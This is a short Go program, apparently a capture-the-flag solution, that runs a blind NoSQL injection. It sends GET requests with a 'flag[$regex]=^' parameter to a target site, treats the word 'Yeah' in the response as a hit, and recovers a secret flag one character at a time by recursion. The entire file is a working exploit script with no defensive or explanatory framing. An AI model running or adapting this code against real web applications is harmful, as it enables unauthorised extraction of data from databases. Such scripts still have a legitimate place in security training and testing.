package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func BlindNoSQL(b string) {
	var char []rune
	for i := 32; i <= 126; i++ {
		if rune(i) != '*' && rune(i) != '+' && rune(i) != '.' && rune(i) != '?' && rune(i) != '|' && rune(i) != '#' && rune(i) != '&' && rune(i) != '$' && rune(i) != ' ' {
			char = append(char, rune(i))
		}
	}
	var url string
	url = b
	for _, j := range char {
		url = b + string(j)
		req, _ := http.NewRequest("GET", url, nil)
		res, _ := http.DefaultClient.Do(req)
		defer res.Body.Close()
		body, _ := ioutil.ReadAll(res.Body)
		resp := string(body)
		if strings.Contains(resp, "Yeah") {
			fmt.Printf(string(j))
			url = b + string(j)
			BlindNoSQL(url)
		}
	}
}

func main() {
	var url = "http://web.site?name=nosqlblind&flag[$regex]=^"
	BlindNoSQL(url)
}
